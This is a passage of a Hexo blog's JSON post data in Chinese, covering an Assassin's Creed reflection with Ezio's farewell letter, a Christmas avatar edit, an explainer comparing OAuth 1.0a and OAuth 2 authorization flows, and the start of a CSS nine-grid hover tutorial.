\n游戏情节里有一幕我印象特别深，年迈的Ezio将地下城军火库的首领刺死，单膝跪地抱着他的尸体，缓缓的说：“杀戮是可耻的…”。你能否想象，这是一个手沾鲜血，以刺杀为荣的刺客大师，对着刚被自己刺杀的将亡人说出的一番话。人到了死神降临这一步，才会明白所谓是非成败转头空，才会明白权利和金钱都会在下一次眨眼中灰飞烟灭。而杀人者Ezio此时最想告诉对方的，就是对方杀戮的原罪，不是其他。Ezio此时的眼神不是锋利的，而是坚定如磐石，我想到这一步，头发灰白的Ezio是参透了信条何谓“万事皆允”。Ezio异常从容与坚定，他知道他的杀戮必将会带来救赎，这是上天的允许，也是内心的智慧。刀锋使处，字句溃逃，任何的道理都无法阻止手中将逝的灵魂。\n![年迈的Ezio](/assets/blogImg/ckxt4.jpg)      \n\n到了这个时候，才知道年过半百的Ezio为什么在君士坦丁堡受这么多人的尊重，才知道为什么他严厉指责因鲁莽而错杀他人的徒弟，不全是因为高明的刺杀艺术，更多的是他比更多年轻人知道内心一个允字的定夺。而最后，Ezio完成了对自己的救赎，英雄迟暮，卸甲归田。一颗颠簸的心，终于泡在村灯狗吠之中。在定夺了这么多人的命运之后，他终于想到了自己，想到了Sophia，想到了佛罗伦萨。如果世上有一个人能阻止他，那这个人肯定是Ezio自己，因而他允许了英雄的离去，从容的卸下袖剑，留下背影，自此，永不回头。而门前的花与阳光在岁月中偷偷窜出，似乎等了他几十年。\n\nEzio最后的信：\n> When I was a young man,              \n> 当我还是个年轻的小伙子                \n> I had liberty, but I did not see it.                 \n> 我拥有自由，却从未认知                  \n> I had time, but I did not know it.                   \n> 我拥有时间，却毫不知情                   \n> And I had love, but I did not feel it.                   \n> 而我亦拥有爱，却从未感觉到                   \n> Many decades would pass before I understood the meaning of all three.                   \n> 直到数十年过去后，我才真正理解这三项的意义                   \n> And now, the twilight of my life, misunderstanding has past into contentment.                   \n> 而现在，垂暮之年的我，这领悟让我感到满足                   \n> Love, liberty, and time: once was so disposable, are the fuels that drive me forward.                   \n> 曾经能自由支配的爱，自由以及时间，是支持我前进的动力                   \n> And love, most especially, mia caro.                   \n> 而爱，是最特别的一个， 亲爱的                   \n> For you, our children, our brothers and sisters.                   \n> 为你，为我们的孩子以及为我们的兄弟姐妹们                   \n> And for the vast and wonderful world that gives us lives and keeps us guessing,                   \n> 为这赐予我们生命与惊奇的广阔，精彩的世界                   \n> endless affection，mio Sofia,                   \n> 至死不渝的挚爱， 我的索菲亚                   \n> Forever yours, Ezio Auditore                   \n> 永远属于你的， Ezio Auditore                   ","slug":"assassins-creed","updated":1409147515000,"excerpt":"<p><img src=\"/assets/blogImg/ckxt0.jpg\" alt=\"刺客信条-兄弟会海报\">     </p>\n<blockquote>\n<p>Nothing is true, everything is permitted.万物皆虚，万事皆允。        </p>\n</blockquote>\n<p><em>—— 《刺客信条2》《刺客信条：兄弟会》《刺客信条：启示录》-Ezio三部曲</em><br>","_id":"qpo60xulafk5ixq5","categories":[],"photos":[],"link":""},{"layout":"post","title":"圣诞到了，帮修改一个头像","date":1355899680000,"comments":true,"tags":["10f9ur1kcl6zfda3","u2apvepnvh8nr37o"],"content":"<p><img src=\"/assets/blogImg/xmas_ico0.jpg\" alt=\"ico原来的样子\">      </p>\n<blockquote>\n<p>帮忙把这只狐狸塞到圣诞袜子里或者带上圣诞帽~~~~ ——鱼头       </p>\n</blockquote>\n<a id=\"more\"></a>\n\n<p>鱼头君，我终于做好了！花了我整整……好吧，其实是一直偷懒没做我就承认了。<br>按照你的要求，弄成这样的：<br><img src=\"/assets/blogImg/xmas_ico1.jpg\" alt=\"狐狸妹纸太大我塞不下-_-!\"><br>或者这样的：<br><img src=\"/assets/blogImg/xmas_ico2.jpg\" alt=\"圣诞帽的狐狸妹纸\"><br>其实我最喜欢的是这样的：<br><img src=\"/assets/blogImg/xmas_ico3.jpg\" alt=\"呆萌傻缺才是我得菜好么\">         </p>\n<p><strong>Happy Chrismas!</strong></p>\n","source":"_posts/a-chrismas-ico.markdown","raw":"---\nlayout: post\ntitle: \"圣诞到了，帮修改一个头像\"\ndate: 2012-12-19 14:48\ncomments: true\ntags: \n\t- 设计 \n\t- 杂谈\n---\n\n![ico原来的样子](/assets/blogImg/xmas_ico0.jpg)      \n> 帮忙把这只狐狸塞到圣诞袜子里或者带上圣诞帽~~~~ ——鱼头       \n\n<!-- more -->\n\n鱼头君，我终于做好了！花了我整整……好吧，其实是一直偷懒没做我就承认了。          \n按照你的要求，弄成这样的：            \n![狐狸妹纸太大我塞不下-_-!](/assets/blogImg/xmas_ico1.jpg)        \n或者这样的：               \n![圣诞帽的狐狸妹纸](/assets/blogImg/xmas_ico2.jpg)            \n其实我最喜欢的是这样的：              \n![呆萌傻缺才是我得菜好么](/assets/blogImg/xmas_ico3.jpg)         \n\n**Happy Chrismas!**","slug":"a-chrismas-ico","updated":1409147529000,"excerpt":"<p><img src=\"/assets/blogImg/xmas_ico0.jpg\" alt=\"ico原来的样子\">      </p>\n<blockquote>\n<p>帮忙把这只狐狸塞到圣诞袜子里或者带上圣诞帽~~~~ ——鱼头       </p>\n</blockquote>\n","_id":"ncj5jut5zltilfwa","categories":[],"photos":[],"link":""},{"layout":"post","title":"谈谈OAuth1,OAuth2异同","date":1376189700000,"comments":true,"tags":["ejm72ndmomwgbvme"],"content":"<h2 id=\"一、写在前面\"><strong>一、写在前面</strong></h2>\n<p>在收集资料时，我查询和学习了许多介绍OAuth的文章，这些文章有好有坏，但大多是从个例出发。因此我想从官方文档出发，结合在stackoverflow上的一些讨论，一并整理一下。整理的内容分为OAuth1.0a和OAuth2两部分。</p>\n<blockquote>\n<p>OAuth 1.0a：One Leg -&gt;Two Leg -&gt; Three Legged<br>OAuth 2:Two Leg -&gt;Three Legged (附：Refresh Token的方式)</p>\n</blockquote>\n<p>这两种模式都是按箭头从左往右安全性递增，其实现也会相对复杂。关于官方的这种leg（腿？）的说法，在中文翻译中比较少有文章提及。下面分别来介绍OAuth的这5种授权流程。</p>\n<p><a id=\"more\"></a></p>\n<h2 id=\"二、OAuth1-0a\"><strong>二、OAuth1.0a</strong></h2>\n<p><strong>2.1 OAuth 1.0a (One Leg)</strong></p>\n<ol>\n<li>应用给服务器发送一个签名请求，附带以下参数：           <ul>\n<li>oauth_token Empty String             </li>\n<li>oauth_consumer_key                  </li>\n<li>oauth_timestamp                   </li>\n<li>oauth_nonce                    </li>\n<li>oauth_signature                  </li>\n<li>oauth_signature_method              </li>\n<li>oauth_version Optional                  </li>\n</ul>\n</li>\n<li>服务验证并授予对资源的访问                 </li>\n<li>应用程序利用请求的资源                </li>\n</ol>\n<p><strong>2.2 OAuth 1.0a (Two Legs)</strong></p>\n<ol>\n<li>应用发送一个签名请求，以获取 Request Token：                 <ul>\n<li>oauth_consumer_key                          </li>\n<li>oauth_timestamp                     </li>\n<li>oauth_nonce                        </li>\n<li>oauth_signature                  </li>\n<li>oauth_signature_method                       </li>\n<li>oauth_version Optional                      </li>\n</ul>\n</li>\n<li>服务器返回Request Token：                   <ul>\n<li>oauth_token                    </li>\n<li>oauth_token_secret                  </li>\n<li>Additional Parameters / Arguments                   </li>\n</ul>\n</li>\n<li>发送签名请求，用Request Token换取Access Token                      <ul>\n<li>oauth_token Request Token                    </li>\n<li>oauth_consumer_key                   </li>\n<li>oauth_nonce                 </li>\n<li>oauth_signature                      </li>\n<li>oauth_signature_method                    </li>\n<li>oauth_version                           </li>\n</ul>\n</li>\n<li>服务器返回Access Token和Token Secret    </li>\n<li>应用通过Access Token和Token Secret利用请求的资源</li>\n</ol>\n<p><strong>2.3 OAuth 1.0a (Three Legged)</strong></p>\n<ol>\n<li>应用发送一个签名请求，以获取 Request Token：                <ul>\n<li>oauth_consumer_key                       </li>\n<li>oauth_timestamp                       </li>\n<li>oauth_nonce                       </li>\n<li>oauth_signature                       </li>\n<li>oauth_signature_method                       </li>\n<li>oauth_version Optional                       </li>\n</ul>\n</li>\n<li>服务器返回Request Token：                       <ul>\n<li>oauth_token                       </li>\n<li>oauth_token_secret                       </li>\n<li>oauth_callback_confirmed                       </li>\n<li>… Additional Parameters / Arguments                       </li>\n</ul>\n</li>\n<li>发送给用户授权的URL                       <ul>\n<li>oauth_token                       </li>\n</ul>\n</li>\n<li>提示用户进行授权                       </li>\n<li>用户进行授权                       </li>\n<li>授权结束后返回应用，附带上：                       <ul>\n<li>oauth_token                       </li>\n<li>oauth_verifier                       </li>\n</ul>\n</li>\n<li>发送签名请求，用Request Token换取Access Token                       <ul>\n<li>oauth_token Request Token                       </li>\n<li>oauth_consumer_key                       </li>\n<li>oauth_nonce                       </li>\n<li>oauth_signature                       </li>\n<li>oauth_signature_method                       </li>\n<li>oauth_version                       </li>\n<li>oauth_verifier                       </li>\n</ul>\n</li>\n<li>服务器返回Access Token和Token Secret                       </li>\n<li>应用通过Access Token和Token Secret利用请求的资源                       </li>\n</ol>\n<h2 id=\"三、OAuth2\"><strong>三、OAuth2</strong></h2>\n<p><strong> 3.1 OAuth 2 (Two Legged)</strong></p>\n<p>3.1.1 客户端凭据方式              </p>\n<ol>\n<li>应用发送请求到服务器：                   <ul>\n<li>grant_type = client_credentials<br>如果没有使用Authorization（Authorization: Basic Base64(client_id:client_secret)） 的header，必须附带参数为：                   </li>\n<li>client_id                   </li>\n<li>client_secret                   </li>\n</ul>\n</li>\n<li>服务器以Access Token回应                   <ul>\n<li>access_token                   </li>\n<li>expires_in                   </li>\n<li>token_type                   </li>\n</ul>\n</li>\n</ol>\n<p>3.1.2 隐式授予方式               </p>\n<ol>\n<li>应用发送请求到服务器：                                                <ul>\n<li>response_type = token                      </li>\n<li>redirect_uri This is a server-side Redirection URI hosted by the provider or yourself.                      </li>\n<li>scope                      </li>\n<li>state Optional                      </li>\n<li>client_id                      </li>\n</ul>\n</li>\n<li>用户可根据需要授权。                      <ul>\n<li>username                      </li>\n<li>password                      </li>\n</ul>\n</li>\n<li>服务器将响应包含access_token在内的redirect_uri                      </li>\n<li>应用程序跳转至redirect_uri                      </li>\n<li>redirect_uri将响应一段脚本或HTML片段。响应的脚本或HTML片段包含参数access_token，还有您可能需要的任何其他参数。                  </li>\n</ol>\n<p>3.1.3 资源所有者密码方式                  </p>\n<ol>\n<li>应用向资源所有者请求凭证                   <ul>\n<li>username                   </li>\n<li>password                   </li>\n</ul>\n</li>\n<li>应用使用凭证，向服务器发送请求                   <ul>\n<li>grant_type = password                   </li>\n<li>username                   </li>\n<li>password<br>url看起来会像这样：grant_type=password&amp;username=my_username&amp;password=my_password<br>如果你没有使用Authorization的header，必须附带上参数：                   </li>\n<li>client_id                   </li>\n<li>client_secret<br>url看起来会像是：<br>grant_type=password&amp;username=my_username&amp;password=my_password&amp;client_id=random_string&amp;client_secret=random_secret                   </li>\n</ul>\n</li>\n<li>服务器返回Access Toke                   <ul>\n<li>access_token                   </li>\n<li>expires_in                   </li>\n<li>token_type                   </li>\n</ul>\n</li>\n</ol>\n<p><strong> 3.2 OAuth 2 (Three Legged) </strong></p>\n<ol>\n<li>应用重定向用户到授权服务：                    <ul>\n<li>client_id                    </li>\n<li>redirect_uri                    </li>\n<li>response_type                    </li>\n<li>state Optional; Unique identifier to protect against CSRF                    </li>\n<li>scope Optional; what data your application can access.<br>url看起来会像是：<br>oauth_service/login/oauth/authorize?client_id=3MVG9lKcPoNINVB&amp;redirect_uri=<a href=\"http://localhost/oauth/code_callback&amp;scope=user\" target=\"_blank\" rel=\"external\">http://localhost/oauth/code_callback&amp;scope=user</a>                    </li>\n</ul>\n</li>\n<li>用户登录服务器并确认授权给应用                    </li>\n<li>服务器重定向用户到redirect_url ，附带参数：                    <ul>\n<li>code                    </li>\n<li>state                    </li>\n</ul>\n</li>\n<li>应用拿到code，并换取Access Token                    <ul>\n<li>client_id                    </li>\n<li>client_secret                    </li>\n<li>code                    </li>\n<li>redirect_uri Optional;                    </li>\n<li>grant_type = “authorization_code”                    </li>\n</ul>\n</li>\n<li>如果的client_id和client_secret是有效的，服务器将调用一个回调redirect_url，包含ACCESS_TOKEN                    <ul>\n<li>access_token                    </li>\n<li>expires_in                    </li>\n<li>refresh_token                    </li>\n</ul>\n</li>\n<li>应用保存ACCESS_TOKEN，在随后的请求中使用。通常这个值被存储在session或或cookie，需要时作为授权请求的参数。   </li>\n</ol>\n<p><strong> 3.3 OAuth 2 (Refresh Token 刷新token) </strong></p>\n<p>在OAuth2中，Token会有过期时间，我们必须去refresh_token，使用其他一些先前获得的参数，生成一个新的token。这是一个容易得多的流程。    </p>\n<ol>\n<li>创建刷新令牌请求                  <ul>\n<li>grant_type = “refresh_token”                      </li>\n<li>scope Optional; Cannot have any new scopes not previously defined.                     </li>\n<li>refresh_token                     </li>\n<li>client_id                     </li>\n<li>client_secret                     </li>\n</ul>\n</li>\n<li>服务验证和响应以下参数：                     <ul>\n<li>access_token                     </li>\n<li>issued_at                     </li>\n</ul>\n</li>\n</ol>\n<h2 id=\"四、stackoverflow上的一些问答\"><strong>四、stackoverflow上的一些问答</strong></h2>\n<p><strong>Q</strong>：OpenID和OAuth的区别是什么？<br><strong>A</strong>：OpenID是有关身份验证（即证明你是谁），OAuth有关授权（即授予访问权限），推荐博文：<a href=\"http://cakebaker.42dh.com/2008/04/01/openid-versus-oauth-from-the-users-perspective/\" target=\"_blank\" rel=\"external\">从用户的角度来看OpenID和OAuth</a>                    </p>\n<p><strong>Q</strong>：OAuth2与OAuth1不同的地方是？有人可以简单的解释的OAuth2和OAuth1之间的区别吗？ OAuth1现在已经过时，应实施的OAuth2？我没有看到许多实现的OAuth2，大多数仍在使用OAuth，这让我怀疑的OAuth2的准备使用。是吗？<br><strong>A</strong>：OAuth2能更好地支持不是基于浏览器的应用。对于不是基于浏览器的应用程序，这是对OAuth的主要挑战。例如，在OAuth1.0，桌面应用或手机应用必须引导用户打开浏览器所需的服务，与服务进行身份验证，并复制令牌从服务返回给应用程序。这里的主要批评是针对用户体验。使用OAuth2.0，可以用新的方式为用户的应用程序获得授权。<br>OAuth2.0不再需要客户端应用程序拥有密钥。这让人回想起老的Twitter认证的API，它并不需要应用得到HMAC哈希令牌和请求字符串。使用OAuth2.0，应用程序可以通过HTTPS获得令牌。<br>OAuth2.0的签名流程简单得多。没有更多的特殊解析，排序，或编码。<br>OAuth2.0的访问令牌是“短命”的。通常情况下，OAuth1.0的访问令牌可以存储一年或一年以上（Twitter从来没有让他们到期）。 OAuth的2.0有刷新令牌的概念。虽然我不能完全肯定这是什么意思，我的猜测是，您的访问令牌可以是短暂存储的（即基于会话），而你可以刷新令牌。你使用刷新令牌获取新的访问令牌，而不是让用户重新授权您的应用程序。<br>最后，OAuth2.0使得负责处理的OAuth请求的服务器和处理用户的授权服务器之间的角色有一个干净的分离。更多信息，在上述的文章中详述。</p>\n<p><strong>Q</strong>：OAuth2服务器群怎么使用state来防范CSRF？<br><strong>A</strong>：state只是一个随机的字符串，可以做这样的事情：$state = md5(uniqid(rand(), TRUE));在session中记录satate，以便稍后你能做验证。一些额外的资料：<a href=\"http://tools.ietf.org/html/draft-ietf-oauth-v2-threatmodel-00\" target=\"_blank\" rel=\"external\">OAuth2威胁文件模型</a>，<a href=\"http://tools.ietf.org/html/draft-ietf-oauth-v2-26#section-10.12\" target=\"_blank\" rel=\"external\">特别CSRF保护</a>                                    </p>\n","source":"_posts/brief-oauth.markdown","raw":"---\nlayout: post\ntitle: \"谈谈OAuth1,OAuth2异同\"\ndate: 2013-08-11 10:55\ncomments: true\ntags: \n\t- web\n---       \n##**一、写在前面**     \n在收集资料时，我查询和学习了许多介绍OAuth的文章，这些文章有好有坏，但大多是从个例出发。因此我想从官方文档出发，结合在stackoverflow上的一些讨论，一并整理一下。整理的内容分为OAuth1.0a和OAuth2两部分。\n> OAuth 1.0a：One Leg ->Two Leg -> Three Legged            \n> OAuth 2:Two Leg ->Three Legged (附：Refresh Token的方式)\n\n这两种模式都是按箭头从左往右安全性递增，其实现也会相对复杂。关于官方的这种leg（腿？）的说法，在中文翻译中比较少有文章提及。下面分别来介绍OAuth的这5种授权流程。\n\n<!--more-->\n##**二、OAuth1.0a**\n**2.1 OAuth 1.0a (One Leg)**\n\n1. 应用给服务器发送一个签名请求，附带以下参数：           \n\t* oauth_token Empty String             \n\t* oauth_consumer_key                  \n\t* oauth_timestamp                   \n\t* oauth_nonce                    \n\t* oauth_signature                  \n\t* oauth_signature_method              \n\t* oauth_version Optional                  \n2. 服务验证并授予对资源的访问                 \n3. 应用程序利用请求的资源                \n\n**2.2 OAuth 1.0a (Two Legs)**\n\n1. 应用发送一个签名请求，以获取 Request Token：                 \n\t* oauth_consumer_key                          \n\t* oauth_timestamp                     \n\t* oauth_nonce                        \n\t* oauth_signature                  \n\t* oauth_signature_method                       \n\t* oauth_version Optional                      \n2. 服务器返回Request Token：                   \n\t* oauth_token                    \n\t* oauth_token_secret                  \n\t* Additional Parameters / Arguments                   \n3. 发送签名请求，用Request Token换取Access Token                      \n\t* oauth_token Request Token                    \n\t* oauth_consumer_key                   \n\t* oauth_nonce                 \n\t* oauth_signature                      \n\t* oauth_signature_method                    \n\t* oauth_version                           \n4. 服务器返回Access Token和Token Secret    \n5. 应用通过Access Token和Token Secret利用请求的资源\n\n**2.3 OAuth 1.0a (Three Legged)**\n\n1. 应用发送一个签名请求，以获取 Request Token：                \n\t* oauth_consumer_key                       \n\t* oauth_timestamp                       \n\t* oauth_nonce                       \n\t* oauth_signature                       \n\t* oauth_signature_method                       \n\t* oauth_version Optional                       \n2. 服务器返回Request Token：                       \n\t* oauth_token                       \n\t* oauth_token_secret                       \n\t* oauth_callback_confirmed                       \n\t* … Additional Parameters / Arguments                       \n3. 发送给用户授权的URL                       \n\t* oauth_token                       \n4. 提示用户进行授权                       \n5. 用户进行授权                       \n6. 授权结束后返回应用，附带上：                       \n\t* oauth_token                       \n\t* oauth_verifier                       \n7. 发送签名请求，用Request Token换取Access Token                       \n\t* oauth_token Request Token                       \n\t* oauth_consumer_key                       \n\t* oauth_nonce                       \n\t* oauth_signature                       \n\t* oauth_signature_method                       \n\t* oauth_version                       \n\t* oauth_verifier                       \n8. 服务器返回Access Token和Token Secret                       \n9. 应用通过Access Token和Token Secret利用请求的资源                       \n\n##**三、OAuth2**         \n\n** 3.1 OAuth 2 (Two Legged)**\n\n3.1.1 客户端凭据方式              \n\n1. 应用发送请求到服务器：                   \n\t* grant_type = client_credentials                   \n如果没有使用Authorization（Authorization: Basic Base64(client_id:client_secret)） 的header，必须附带参数为：                   \n\t* client_id                   \n\t* client_secret                   \n2. 服务器以Access Token回应                   \n\t* access_token                   \n\t* expires_in                   \n\t* token_type                   \n\n3.1.2 隐式授予方式               \n\n1. 应用发送请求到服务器：                                                \n\t* response_type = token                      \n\t* redirect_uri This is a server-side Redirection URI hosted by the provider or yourself.                      \n\t* scope                      \n\t* state Optional                      \n\t* client_id                      \n2. 用户可根据需要授权。                      \n\t* username                      \n\t* password                      \n3. 服务器将响应包含access_token在内的redirect_uri                      \n4. 应用程序跳转至redirect_uri                      \n5. redirect_uri将响应一段脚本或HTML片段。响应的脚本或HTML片段包含参数access_token，还有您可能需要的任何其他参数。                  \n\n3.1.3 资源所有者密码方式                  \n\n1. 应用向资源所有者请求凭证                   \n\t* username                   \n\t* password                   \n2. 应用使用凭证，向服务器发送请求                   \n\t* grant_type = password                   \n\t* username                   \n\t* password                   \nurl看起来会像这样：grant_type=password&username=my_username&password=my_password                   \n如果你没有使用Authorization的header，必须附带上参数：                   \n\t* client_id                   \n\t* client_secret                   \nurl看起来会像是：                   \ngrant_type=password&username=my_username&password=my_password&client_id=random_string&client_secret=random_secret                   \n3. 服务器返回Access Toke                   \n\t* access_token                   \n\t* expires_in                   \n\t* token_type                   \n\n** 3.2 OAuth 2 (Three Legged) **\n\n1. 应用重定向用户到授权服务：                    \n\t* client_id                    \n\t* redirect_uri                    \n\t* response_type                    \n\t* state Optional; Unique identifier to protect against CSRF                    \n\t* scope Optional; what data your application can access.                    \nurl看起来会像是：                    \noauth_service/login/oauth/authorize?client_id=3MVG9lKcPoNINVB&redirect_uri=http://localhost/oauth/code_callback&scope=user                    \n2. 用户登录服务器并确认授权给应用                    \n3. 服务器重定向用户到redirect_url ，附带参数：                    \n\t* code                    \n\t* state                    \n4. 应用拿到code，并换取Access Token                    \n\t* client_id                    \n\t* client_secret                    \n\t* code                    \n\t* redirect_uri Optional;                    \n\t* grant_type = \"authorization_code\"                    \n5. 如果的client_id和client_secret是有效的，服务器将调用一个回调redirect_url，包含ACCESS_TOKEN                    \n\t* access_token                    \n\t* expires_in                    \n\t* refresh_token                    \n6. 应用保存ACCESS_TOKEN，在随后的请求中使用。通常这个值被存储在session或或cookie，需要时作为授权请求的参数。   \n\n** 3.3 OAuth 2 (Refresh Token 刷新token) **\n\n在OAuth2中，Token会有过期时间，我们必须去refresh_token，使用其他一些先前获得的参数，生成一个新的token。这是一个容易得多的流程。    \n\n1. 创建刷新令牌请求                  \n\t* grant_type = \"refresh_token\"                      \n\t* scope Optional; Cannot have any new scopes not previously defined.                     \n\t* refresh_token                     \n\t* client_id                     \n\t* client_secret                     \n2. 服务验证和响应以下参数：                     \n\t* access_token                     \n\t* issued_at                     \n\n##**四、stackoverflow上的一些问答**         \n                \n**Q**：OpenID和OAuth的区别是什么？                    \n**A**：OpenID是有关身份验证（即证明你是谁），OAuth有关授权（即授予访问权限），推荐博文：[从用户的角度来看OpenID和OAuth](http://cakebaker.42dh.com/2008/04/01/openid-versus-oauth-from-the-users-perspective/)                    \n                   \n**Q**：OAuth2与OAuth1不同的地方是？有人可以简单的解释的OAuth2和OAuth1之间的区别吗？ OAuth1现在已经过时，应实施的OAuth2？我没有看到许多实现的OAuth2，大多数仍在使用OAuth，这让我怀疑的OAuth2的准备使用。是吗？                      \n**A**：OAuth2能更好地支持不是基于浏览器的应用。对于不是基于浏览器的应用程序，这是对OAuth的主要挑战。例如，在OAuth1.0，桌面应用或手机应用必须引导用户打开浏览器所需的服务，与服务进行身份验证，并复制令牌从服务返回给应用程序。这里的主要批评是针对用户体验。使用OAuth2.0，可以用新的方式为用户的应用程序获得授权。                     \nOAuth2.0不再需要客户端应用程序拥有密钥。这让人回想起老的Twitter认证的API，它并不需要应用得到HMAC哈希令牌和请求字符串。使用OAuth2.0，应用程序可以通过HTTPS获得令牌。                               \nOAuth2.0的签名流程简单得多。没有更多的特殊解析，排序，或编码。                           \nOAuth2.0的访问令牌是“短命”的。通常情况下，OAuth1.0的访问令牌可以存储一年或一年以上（Twitter从来没有让他们到期）。 OAuth的2.0有刷新令牌的概念。虽然我不能完全肯定这是什么意思，我的猜测是，您的访问令牌可以是短暂存储的（即基于会话），而你可以刷新令牌。你使用刷新令牌获取新的访问令牌，而不是让用户重新授权您的应用程序。                                     \n最后，OAuth2.0使得负责处理的OAuth请求的服务器和处理用户的授权服务器之间的角色有一个干净的分离。更多信息，在上述的文章中详述。\n                   \n**Q**：OAuth2服务器群怎么使用state来防范CSRF？                        \n**A**：state只是一个随机的字符串，可以做这样的事情：$state = md5(uniqid(rand(), TRUE));在session中记录satate，以便稍后你能做验证。一些额外的资料：[OAuth2威胁文件模型](http://tools.ietf.org/html/draft-ietf-oauth-v2-threatmodel-00)，[特别CSRF保护](http://tools.ietf.org/html/draft-ietf-oauth-v2-26#section-10.12)                                    \n","slug":"brief-oauth","updated":1409147614000,"excerpt":"<h2 id=\"一、写在前面\"><strong>一、写在前面</strong></h2>\n<p>在收集资料时，我查询和学习了许多介绍OAuth的文章，这些文章有好有坏，但大多是从个例出发。因此我想从官方文档出发，结合在stackoverflow上的一些讨论，一并整理一下。整理的内容分为OAuth1.0a和OAuth2两部分。</p>\n<blockquote>\n<p>OAuth 1.0a：One Leg -&gt;Two Leg -&gt; Three Legged<br>OAuth 2:Two Leg -&gt;Three Legged (附：Refresh Token的方式)</p>\n</blockquote>\n<p>这两种模式都是按箭头从左往右安全性递增，其实现也会相对复杂。关于官方的这种leg（腿？）的说法，在中文翻译中比较少有文章提及。下面分别来介绍OAuth的这5种授权流程。</p>\n<p>","_id":"tbybyssv0lnlf6ez","categories":[],"photos":[],"link":""},{"layout":"post","title":"css实现九宫格(一)","date":1355483700000,"comments":true,"tags":["onq1addfunnbgl8n"],"key":"3","content":"<p>前段时间，我的 leader Henry在群里面分享了一道<a href=\"http://www.etao.com/\" target=\"_blank\" rel=\"external\">一淘</a>的面试题。         题目非常的有趣，忙完前阵的工作之后突然记起，也尝试做了一下。</p>\n<blockquote>\n<p>9个元素，每个50*50px，排成九宫格<br>默认是border颜色为blue，hover到格子上变成red（兼容到IE6）</p>\n</blockquote>\n<p><img src=\"/assets/blogImg/jiugongge1.jpg\" alt=\"css题目\">    </p>\n<p><a id=\"more\"></a><br>做成九宫格大家都会，但题目的陷阱就在hover上。鼠标hover到格子4，格子5时，其实他们“共用”了一条边。由于是纯css实现的，我们不可能说用js去动态改变dom，因此怎样实现“公用边”就成为了难点。</p>\n<p><strong>尝试的过程：</strong>           </p>\n<ul>\n<li>我的第一个想法，用“叠加”的方式实现“公用边”；        </li>\n<li>后来的想法，用table的border-collapse实现“公用边”；          </li>\n<li>在table想法的基础上改进；</li>\n<li>一种更简便的做法，不需要border，见九宫格(二)                       </li>\n</ul>\n<h2 id=\"我的第一个想法\"><strong>我的第一个想法</strong></h2>\n<p>先做做看，尝试永远是第一步。我将9个div都设置了5px的border，排成了九宫格，添加了hover，这时候初始的效果是：<br><img src=\"/assets/blogImg/jiugongge2.jpg\" alt=\"初始效果\"><br>这样其实格子之间的距离是两倍border（10px）。需要再将中间的一竖（2，5，8）设置<code>margin-left:-5px;margin-right:-5px;</code>,再将中间的一横（3，4，5）设置<code>margin-top:-5px;margin-bottom:-5px;</code>，这样等于是强制把格子间的距离“拉”到5px。<br><img src=\"/assets/blogImg/jiugongge3.jpg\" alt=\"把格子间的距离“拉”到5px\"><br>到这一步，简单的九宫格是完成了，但hover之后会发现，格子的边会被挡住（格子5的下边和右边分别被格子8和格子6挡住）。因为这里“公用边”的思路准确来说是“重合边”，是用负值的margin强制定位的。而我的解决方式是hover时添加<code>z-index:999</code>，让hover到的格子在最上层显示而不会被挡住。同时，不要忘记在9个div的css里面添加一句让z-index生效的<code>position: relative;</code>，具体原因看<a href=\"http://www.csser.com/question/4f4332dedbc7b0ac4c00034e\" target=\"_blank\" rel=\"external\">这里</a>。     </p>\n<p>代码君：<br>1.html：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"test0\"</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"lr_indent\"</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"tb_indent\"</span>&gt;</span>4<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"lr_indent tb_indent\"</span>&gt;</span>5<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"tb_indent\"</span>&gt;</span>6<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>7<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"lr_indent\"</span>&gt;</span>8<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span>9<span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div></pre></td></tr></table></figure>\n\n<p>2.css:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div 